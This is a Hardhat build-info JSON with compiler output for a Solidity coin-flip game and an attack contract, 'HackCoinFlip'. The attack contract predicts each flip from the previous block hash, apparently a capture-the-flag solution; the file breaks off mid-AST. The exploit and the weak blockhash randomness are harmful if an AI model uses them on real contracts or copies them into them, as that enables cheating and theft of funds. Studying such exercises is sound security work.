{
	"id": "750435cb5a71baddc563b8b3871d20b6",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.0",
	"solcLongVersion": "0.8.0+commit.c7dfd78e",
	"input": {
		"language": "Solidity",
		"sources": {
			"contracts/hackcoinflip.sol": {
				"content": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\nimport \"./coinflip.sol\";\r\n\r\ncontract HackCoinFlip{\r\n\r\n    CoinFlip public coinFlipContract;\r\n    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\r\n\r\n    constructor(address _coinFlipContract) public{\r\n        coinFlipContract = CoinFlip(_coinFlipContract);\r\n    }\r\n    function makeGuess() public {\r\n\r\n        uint256 blockValue = uint256(blockhash(block.number-1));\r\n        uint256 coinFlip = blockValue/FACTOR;\r\n        bool guess = coinFlip == 1 ? true : false;\r\n\r\n        coinFlipContract.flip(guess);\r\n    }\r\n}"
			},
			"contracts/coinflip.sol": {
				"content": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\n\r\ncontract CoinFlip {\r\n\r\n  uint256 public consecutiveWins;\r\n  uint256 lastHash;\r\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\r\n\r\n  constructor() public {\r\n    consecutiveWins = 0;\r\n  }\r\n\r\n  function flip(bool _guess) public returns (bool) {\r\n    uint256 blockValue = uint256(blockhash(block.number -1 ));\r\n\r\n    if (lastHash == blockValue) {\r\n      revert();\r\n    }\r\n\r\n    lastHash = blockValue;\r\n    uint256 coinFlip = blockValue/FACTOR;\r\n    bool side = coinFlip == 1 ? true : false;\r\n\r\n    if (side == _guess) {\r\n      consecutiveWins++;\r\n      return true;\r\n    } else {\r\n      consecutiveWins = 0;\r\n      return false;\r\n    }\r\n  }\r\n}"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"contracts/coinflip.sol": {
				"CoinFlip": {
					"abi": [
						{
							"inputs": [],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "consecutiveWins",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "bool",
									"name": "_guess",
									"type": "bool"
								}
							],
							"name": "flip",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contracts/coinflip.sol\":62:751  contract CoinFlip {\r... */\n  mstore(0x40, 0x80)\n    /* \"contracts/coinflip.sol\":160:237  57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x8000000000000000000000000000000000000000000000000000000000000000\n    /* \"contracts/coinflip.sol\":143:237  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x02\n  sstore\n    /* \"contracts/coinflip.sol\":244:297  constructor() public {\r... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n    /* \"contracts/coinflip.sol\":290:291  0 */\n  0x00\n    /* \"contracts/coinflip.sol\":272:287  consecutiveWins */\n  dup1\n    /* \"contracts/coinflip.sol\":272:291  consecutiveWins = 0 */\n  dup2\n  swap1\n  sstore\n  pop\n    /* \"contracts/coinflip.sol\":62:751  contract CoinFlip {\r... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/coinflip.sol\":62:751  contract CoinFlip {\r... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x1d263f67\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xe6f334d7\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/coinflip.sol\":303:748  function flip(bool _guess) public returns (bool) {\r... */\n    tag_3:\n      tag_5\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_6\n      swap2\n      swap1\n      tag_7\n      jump\t// in\n    tag_6:\n      tag_8\n      jump\t// in\n    tag_5:\n      mload(0x40)\n      tag_9\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/coinflip.sol\":87:117  uint256 public consecutiveWins */\n    tag_4:\n      tag_11\n      tag_12\n      jump\t// in\n    tag_11:\n      mload(0x40)\n      tag_13\n      swap2\n      swap1\n      tag_14\n      jump\t// in\n    tag_13:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/coinflip.sol\":303:748  function flip(bool _guess) public returns (bool) {\r... */\n    tag_8:\n        /* \"contracts/coinflip.sol\":346:350  bool */\n      0x00\n        /* \"contracts/coinflip.sol\":359:377  uint256 blockValue */\n      dup1\n        /* \"contracts/coinflip.sol\":412:413  1 */\n      0x01\n        /* \"contracts/coinflip.sol\":398:410  block.number */\n      number\n        /* \"contracts/coinflip.sol\":398:413  block.number -1 */\n      tag_16\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_16:\n        /* \"contracts/coinflip.sol\":388:415  blockhash(block.number -1 ) */\n      blockhash\n        /* \"contracts/coinflip.sol\":380:416  uint256(blockhash(block.number -1 )) */\n      0x00\n      shr\n        /* \"contracts/coinflip.sol\":359:416  uint256 blockValue = uint256(blockhash(block.number -1 )) */\n      swap1\n      pop\n        /* \"contracts/coinflip.sol\":441:451  blockValue */\n      dup1\n        /* \"contracts/coinflip.sol\":429:437  lastHash */\n      sload(0x01)\n        /* \"contracts/coinflip.sol\":429:451  lastHash == blockValue */\n      eq\n        /* \"contracts/coinflip.sol\":425:478  if (lastHash == blockValue) {\r... */\n      iszero\n      tag_18\n      jumpi\n        /* \"contracts/coinflip.sol\":462:470  revert() */\n      0x00\n      dup1\n      revert\n        /* \"contracts/coinflip.sol\":425:478  if (lastHash == blockValue) {\r... */\n    tag_18:\n        /* \"contracts/coinflip.sol\":497:507  blockValue */\n      dup1\n        /* \"contracts/coinflip.sol\":486:494  lastHash */\n      0x01\n        /* \"contracts/coinflip.sol\":486:507  lastHash = blockValue */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/coinflip.sol\":514:530  uint256 coinFlip */\n      0x00\n        /* \"contracts/coinflip.sol\":544:550  FACTOR */\n      sload(0x02)\n        /* \"contracts/coinflip.sol\":533:543  blockValue */\n      dup3\n        /* \"contracts/coinflip.sol\":533:550  blockValue/FACTOR */\n      tag_19\n      swap2\n      swap1\n      tag_20\n      jump\t// in\n    tag_19:\n        /* \"contracts/coinflip.sol\":514:550  uint256 coinFlip = blockValue/FACTOR */\n      swap1\n      pop\n        /* \"contracts/coinflip.sol\":557:566  bool side */\n      0x00\n        /* \"contracts/coinflip.sol\":581:582  1 */\n      0x01\n        /* \"contracts/coinflip.sol\":569:577  coinFlip */\n      dup3\n        /* \"contracts/coinflip.sol\":569:582  coinFlip == 1 */\n      eq\n        /* \"contracts/coinflip.sol\":569:597  coinFlip == 1 ? true : false */\n      tag_21\n      jumpi\n        /* \"contracts/coinflip.sol\":592:597  false */\n      0x00\n        /* \"contracts/coinflip.sol\":569:597  coinFlip == 1 ? true : false */\n      jump(tag_22)\n    tag_21:\n        /* \"contracts/coinflip.sol\":585:589  true */\n      0x01\n        /* \"contracts/coinflip.sol\":569:597  coinFlip == 1 ? true : false */\n    tag_22:\n        /* \"contracts/coinflip.sol\":557:597  bool side = coinFlip == 1 ? true : false */\n      swap1\n      pop\n        /* \"contracts/coinflip.sol\":618:624  _guess */\n      dup5\n        /* \"contracts/coinflip.sol\":610:624  side == _guess */\n      iszero\n      iszero\n        /* \"contracts/coinflip.sol\":610:614  side */\n      dup2\n        /* \"contracts/coinflip.sol\":610:624  side == _guess */\n      iszero\n      iszero\n      eq\n        /* \"contracts/coinflip.sol\":606:743  if (side == _guess) {\r... */\n      iszero\n      tag_23\n      jumpi\n        /* \"contracts/coinflip.sol\":635:650  consecutiveWins */\n      0x00\n      dup1\n        /* \"contracts/coinflip.sol\":635:652  consecutiveWins++ */\n      dup2\n      sload\n      dup1\n      swap3\n      swap2\n      swap1\n      tag_24\n      swap1\n      tag_25\n      jump\t// in\n    tag_24:\n      swap2\n      swap1\n      pop\n      sstore\n      pop\n        /* \"contracts/coinflip.sol\":668:672  true */\n      0x01\n        /* \"contracts/coinflip.sol\":661:672  return true */\n      swap4\n      pop\n      pop\n      pop\n      pop\n      jump(tag_15)\n        /* \"contracts/coinflip.sol\":606:743  if (side == _guess) {\r... */\n    tag_23:\n        /* \"contracts/coinflip.sol\":713:714  0 */\n      0x00\n        /* \"contracts/coinflip.sol\":695:710  consecutiveWins */\n      dup1\n        /* \"contracts/coinflip.sol\":695:714  consecutiveWins = 0 */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/coinflip.sol\":730:735  false */\n      0x00\n        /* \"contracts/coinflip.sol\":723:735  return false */\n      swap4\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/coinflip.sol\":303:748  function flip(bool _guess) public returns (bool) {\r... */\n    tag_15:\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"contracts/coinflip.sol\":87:117  uint256 public consecutiveWins */\n    tag_12:\n      sload(0x00)\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":7:140   */\n    tag_28:\n      0x00\n        /* \"#utility.yul\":88:94   */\n      dup2\n        /* \"#utility.yul\":75:95   */\n      calldataload\n        /* \"#utility.yul\":66:95   */\n      swap1\n      pop\n        /* \"#utility.yul\":104:134   */\n      tag_30\n        /* \"#utility.yul\":128:133   */\n      dup2\n        /* \"#utility.yul\":104:134   */\n      tag_31\n      jump\t// in\n    tag_30:\n        /* \"#utility.yul\":56:140   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":146:402   */\n    tag_7:\n      0x00\n        /* \"#utility.yul\":251:253   */\n      0x20\n        /* \"#utility.yul\":239:248   */\n      dup3\n        /* \"#utility.yul\":230:237   */\n      dup5\n        /* \"#utility.yul\":226:249   */\n      sub\n        /* \"#utility.yul\":222:254   */\n      slt\n        /* \"#utility.yul\":219:221   */\n      iszero\n      tag_33\n      jumpi\n        /* \"#utility.yul\":267:268   */\n      0x00\n        /* \"#utility.yul\":264:265   */\n      dup1\n        /* \"#utility.yul\":257:269   */\n      revert\n        /* \"#utility.yul\":219:221   */\n    tag_33:\n        /* \"#utility.yul\":310:311   */\n      0x00\n        /* \"#utility.yul\":335:385   */\n      tag_34\n        /* \"#utility.yul\":377:384   */\n      dup5\n        /* \"#utility.yul\":368:374   */\n      dup3\n        /* \"#utility.yul\":357:366   */\n      dup6\n        /* \"#utility.yul\":353:375   */\n      add\n        /* \"#utility.yul\":335:385   */\n      tag_28\n      jump\t// in\n    tag_34:\n        /* \"#utility.yul\":325:385   */\n      swap2\n      pop\n        /* \"#utility.yul\":281:395   */\n      pop\n        /* \"#utility.yul\":209:402   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":408:517   */\n    tag_35:\n        /* \"#utility.yul\":489:510   */\n      tag_37\n        /* \"#utility.yul\":504:509   */\n      dup2\n        /* \"#utility.yul\":489:510   */\n      tag_38\n      jump\t// in\n    tag_37:\n        /* \"#utility.yul\":484:487   */\n      dup3\n        /* \"#utility.yul\":477:511   */\n      mstore\n        /* \"#utility.yul\":467:517   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":523:641   */\n    tag_39:\n        /* \"#utility.yul\":610:634   */\n      tag_41\n        /* \"#utility.yul\":628:633   */\n      dup2\n        /* \"#utility.yul\":610:634   */\n      tag_42\n      jump\t// in\n    tag_41:\n        /* \"#utility.yul\":605:608   */\n      dup3\n        /* \"#utility.yul\":598:635   */\n      mstore\n        /* \"#utility.yul\":588:641   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":647:857   */\n    tag_10:\n      0x00\n        /* \"#utility.yul\":772:774   */\n      0x20\n        /* \"#utility.yul\":761:770   */\n      dup3\n        /* \"#utility.yul\":757:775   */\n      add\n        /* \"#utility.yul\":749:775   */\n      swap1\n      pop\n        /* \"#utility.yul\":785:850   */\n      tag_44\n        /* \"#utility.yul\":847:848   */\n      0x00\n        /* \"#utility.yul\":836:845   */\n      dup4\n        /* \"#utility.yul\":832:849   */\n      add\n        /* \"#utility.yul\":823:829   */\n      dup5\n        /* \"#utility.yul\":785:850   */\n      tag_35\n      jump\t// in\n    tag_44:\n        /* \"#utility.yul\":739:857   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":863:1085   */\n    tag_14:\n      0x00\n        /* \"#utility.yul\":994:996   */\n      0x20\n        /* \"#utility.yul\":983:992   */\n      dup3\n        /* \"#utility.yul\":979:997   */\n      add\n        /* \"#utility.yul\":971:997   */\n      swap1\n      pop\n        /* \"#utility.yul\":1007:1078   */\n      tag_46\n        /* \"#utility.yul\":1075:1076   */\n      0x00\n        /* \"#utility.yul\":1064:1073   */\n      dup4\n        /* \"#utility.yul\":1060:1077   */\n      add\n        /* \"#utility.yul\":1051:1057   */\n      dup5\n        /* \"#utility.yul\":1007:1078   */\n      tag_39\n      jump\t// in\n    tag_46:\n        /* \"#utility.yul\":961:1085   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1091:1276   */\n    tag_20:\n      0x00\n        /* \"#utility.yul\":1148:1168   */\n      tag_48\n        /* \"#utility.yul\":1166:1167   */\n      dup3\n        /* \"#utility.yul\":1148:1168   */\n      tag_42\n      jump\t// in\n    tag_48:\n        /* \"#utility.yul\":1143:1168   */\n      swap2\n      pop\n        /* \"#utility.yul\":1182:1202   */\n      tag_49\n        /* \"#utility.yul\":1200:1201   */\n      dup4\n        /* \"#utility.yul\":1182:1202   */\n      tag_42\n      jump\t// in\n    tag_49:\n        /* \"#utility.yul\":1177:1202   */\n      swap3\n      pop\n        /* \"#utility.yul\":1221:1222   */\n      dup3\n        /* \"#utility.yul\":1211:1213   */\n      tag_50\n      jumpi\n        /* \"#utility.yul\":1226:1244   */\n      tag_51\n      tag_52\n      jump\t// in\n    tag_51:\n        /* \"#utility.yul\":1211:1213   */\n    tag_50:\n        /* \"#utility.yul\":1268:1269   */\n      dup3\n        /* \"#utility.yul\":1265:1266   */\n      dup3\n        /* \"#utility.yul\":1261:1270   */\n      div\n        /* \"#utility.yul\":1256:1270   */\n      swap1\n      pop\n        /* \"#utility.yul\":1133:1276   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1282:1473   */\n    tag_17:\n      0x00\n        /* \"#utility.yul\":1342:1362   */\n      tag_54\n        /* \"#utility.yul\":1360:1361   */\n      dup3\n        /* \"#utility.yul\":1342:1362   */\n      tag_42\n      jump\t// in\n    tag_54:\n        /* \"#utility.yul\":1337:1362   */\n      swap2\n      pop\n        /* \"#utility.yul\":1376:1396   */\n      tag_55\n        /* \"#utility.yul\":1394:1395   */\n      dup4\n        /* \"#utility.yul\":1376:1396   */\n      tag_42\n      jump\t// in\n    tag_55:\n        /* \"#utility.yul\":1371:1396   */\n      swap3\n      pop\n        /* \"#utility.yul\":1415:1416   */\n      dup3\n        /* \"#utility.yul\":1412:1413   */\n      dup3\n        /* \"#utility.yul\":1409:1417   */\n      lt\n        /* \"#utility.yul\":1406:1408   */\n      iszero\n      tag_56\n      jumpi\n        /* \"#utility.yul\":1420:1438   */\n      tag_57\n      tag_58\n      jump\t// in\n    tag_57:\n        /* \"#utility.yul\":1406:1408   */\n    tag_56:\n        /* \"#utility.yul\":1465:1466   */\n      dup3\n        /* \"#utility.yul\":1462:1463   */\n      dup3\n        /* \"#utility.yul\":1458:1467   */\n      sub\n        /* \"#utility.yul\":1450:1467   */\n      swap1\n      pop\n        /* \"#utility.yul\":1327:1473   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1479:1569   */\n    tag_38:\n      0x00\n        /* \"#utility.yul\":1556:1561   */\n      dup2\n        /* \"#utility.yul\":1549:1562   */\n      iszero\n        /* \"#utility.yul\":1542:1563   */\n      iszero\n        /* \"#utility.yul\":1531:1563   */\n      swap1\n      pop\n        /* \"#utility.yul\":1521:1569   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1575:1652   */\n    tag_42:\n      0x00\n        /* \"#utility.yul\":1641:1646   */\n      dup2\n        /* \"#utility.yul\":1630:1646   */\n      swap1\n      pop\n        /* \"#utility.yul\":1620:1652   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1658:1891   */\n    tag_25:\n      0x00\n        /* \"#utility.yul\":1720:1744   */\n      tag_62\n        /* \"#utility.yul\":1738:1743   */\n      dup3\n        /* \"#utility.yul\":1720:1744   */\n      tag_42\n      jump\t// in\n    tag_62:\n        /* \"#utility.yul\":1711:1744   */\n      swap2\n      pop\n        /* \"#utility.yul\":1766:1832   */\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":1759:1764   */\n      dup3\n        /* \"#utility.yul\":1756:1833   */\n      eq\n        /* \"#utility.yul\":1753:1755   */\n      iszero\n      tag_63\n      jumpi\n        /* \"#utility.yul\":1836:1854   */\n      tag_64\n      tag_58\n      jump\t// in\n    tag_64:\n        /* \"#utility.yul\":1753:1755   */\n    tag_63:\n        /* \"#utility.yul\":1883:1884   */\n      0x01\n        /* \"#utility.yul\":1876:1881   */\n      dup3\n        /* \"#utility.yul\":1872:1885   */\n      add\n        /* \"#utility.yul\":1865:1885   */\n      swap1\n      pop\n        /* \"#utility.yul\":1701:1891   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1897:2077   */\n    tag_58:\n        /* \"#utility.yul\":1945:2022   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":1942:1943   */\n      0x00\n        /* \"#utility.yul\":1935:2023   */\n      mstore\n        /* \"#utility.yul\":2042:2046   */\n      0x11\n        /* \"#utility.yul\":2039:2040   */\n      0x04\n        /* \"#utility.yul\":2032:2047   */\n      mstore\n        /* \"#utility.yul\":2066:2070   */\n      0x24\n        /* \"#utility.yul\":2063:2064   */\n      0x00\n        /* \"#utility.yul\":2056:2071   */\n      revert\n        /* \"#utility.yul\":2083:2263   */\n    tag_52:\n        /* \"#utility.yul\":2131:2208   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":2128:2129   */\n      0x00\n        /* \"#utility.yul\":2121:2209   */\n      mstore\n        /* \"#utility.yul\":2228:2232   */\n      0x12\n        /* \"#utility.yul\":2225:2226   */\n      0x04\n        /* \"#utility.yul\":2218:2233   */\n      mstore\n        /* \"#utility.yul\":2252:2256   */\n      0x24\n        /* \"#utility.yul\":2249:2250   */\n      0x00\n        /* \"#utility.yul\":2242:2257   */\n      revert\n        /* \"#utility.yul\":2269:2385   */\n    tag_31:\n        /* \"#utility.yul\":2339:2360   */\n      tag_68\n        /* \"#utility.yul\":2354:2359   */\n      dup2\n        /* \"#utility.yul\":2339:2360   */\n      tag_38\n      jump\t// in\n    tag_68:\n        /* \"#utility.yul\":2332:2337   */\n      dup2\n        /* \"#utility.yul\":2329:2361   */\n      eq\n        /* \"#utility.yul\":2319:2321   */\n      tag_69\n      jumpi\n        /* \"#utility.yul\":2375:2376   */\n      0x00\n        /* \"#utility.yul\":2372:2373   */\n      dup1\n        /* \"#utility.yul\":2365:2377   */\n      revert\n        /* \"#utility.yul\":2319:2321   */\n    tag_69:\n        /* \"#utility.yul\":2309:2385   */\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220797f459a25c8fdd23db0969ced689fc0b8a6dd20a09a6d5071ac3cc0684d881d64736f6c63430008000033\n}\n",
						"bytecode": {
							"generatedSources": [],
							"linkReferences": {},
							"object": "60806040527f800000000000000000000000000000000000000000000000000000000000000060025534801561003457600080fd5b50600080819055506103278061004b6000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80631d263f671461003b578063e6f334d71461006b575b600080fd5b6100556004803603810190610050919061013b565b610089565b6040516100629190610182565b60405180910390f35b610073610120565b604051610080919061019d565b60405180910390f35b60008060014361009991906101e9565b4060001c90508060015414156100ae57600080fd5b806001819055506000600254826100c591906101b8565b90506000600182146100d85760006100db565b60015b9050841515811515141561010c576000808154809291906100fb90610233565b91905055506001935050505061011b565b60008081905550600093505050505b919050565b60005481565b600081359050610135816102da565b92915050565b60006020828403121561014d57600080fd5b600061015b84828501610126565b91505092915050565b61016d8161021d565b82525050565b61017c81610229565b82525050565b60006020820190506101976000830184610164565b92915050565b60006020820190506101b26000830184610173565b92915050565b60006101c382610229565b91506101ce83610229565b9250826101de576101dd6102ab565b5b828204905092915050565b60006101f482610229565b91506101ff83610229565b9250828210156102125761021161027c565b5b828203905092915050565b60008115159050919050565b6000819050919050565b600061023e82610229565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8214156102715761027061027c565b5b600182019050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b6102e38161021d565b81146102ee57600080fd5b5056fea2646970667358221220797f459a25c8fdd23db0969ced689fc0b8a6dd20a09a6d5071ac3cc0684d881d64736f6c63430008000033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 PUSH1 0x2 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x34 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x0 DUP1 DUP2 SWAP1 SSTORE POP PUSH2 0x327 DUP1 PUSH2 0x4B PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1D263F67 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xE6F334D7 EQ PUSH2 0x6B JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x55 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x50 SWAP2 SWAP1 PUSH2 0x13B JUMP JUMPDEST PUSH2 0x89 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x62 SWAP2 SWAP1 PUSH2 0x182 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x73 PUSH2 0x120 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x80 SWAP2 SWAP1 PUSH2 0x19D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x1 NUMBER PUSH2 0x99 SWAP2 SWAP1 PUSH2 0x1E9 JUMP JUMPDEST BLOCKHASH PUSH1 0x0 SHR SWAP1 POP DUP1 PUSH1 0x1 SLOAD EQ ISZERO PUSH2 0xAE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 PUSH1 0x1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 PUSH1 0x2 SLOAD DUP3 PUSH2 0xC5 SWAP2 SWAP1 PUSH2 0x1B8 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH1 0x1 DUP3 EQ PUSH2 0xD8 JUMPI PUSH1 0x0 PUSH2 0xDB JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP DUP5 ISZERO ISZERO DUP2 ISZERO ISZERO EQ ISZERO PUSH2 0x10C JUMPI PUSH1 0x0 DUP1 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH2 0xFB SWAP1 PUSH2 0x233 JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP PUSH1 0x1 SWAP4 POP POP POP POP PUSH2 0x11B JUMP JUMPDEST PUSH1 0x0 DUP1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 SWAP4 POP POP POP POP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x135 DUP2 PUSH2 0x2DA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x14D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x15B DUP5 DUP3 DUP6 ADD PUSH2 0x126 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x16D DUP2 PUSH2 0x21D JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x17C DUP2 PUSH2 0x229 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x197 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x164 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1B2 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x173 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1C3 DUP3 PUSH2 0x229 JUMP JUMPDEST SWAP2 POP PUSH2 0x1CE DUP4 PUSH2 0x229 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x1DE JUMPI PUSH2 0x1DD PUSH2 0x2AB JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1F4 DUP3 PUSH2 0x229 JUMP JUMPDEST SWAP2 POP PUSH2 0x1FF DUP4 PUSH2 0x229 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 0x212 JUMPI PUSH2 0x211 PUSH2 0x27C JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x23E DUP3 PUSH2 0x229 JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 EQ ISZERO PUSH2 0x271 JUMPI PUSH2 0x270 PUSH2 0x27C JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH2 0x2E3 DUP2 PUSH2 0x21D JUMP JUMPDEST DUP2 EQ PUSH2 0x2EE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH26 0x7F459A25C8FDD23DB0969CED689FC0B8A6DD20A09A6D5071AC3C 0xC0 PUSH9 0x4D881D64736F6C6343 STOP ADDMOD STOP STOP CALLER ",
							"sourceMap": "62:689:0:-:0;;;160:77;143:94;;244:53;;;;;;;;;;290:1;272:15;:19;;;;62:689;;;;;;"
						},
						"deployedBytecode": {
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:2388:2",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "56:84:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "66:29:2",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "88:6:2"
																	}
																],
																"functionName": {
																	"name": "calldataload",
																	"nodeType": "YulIdentifier",
																	"src": "75:12:2"
																},
																"nodeType": "YulFunctionCall",
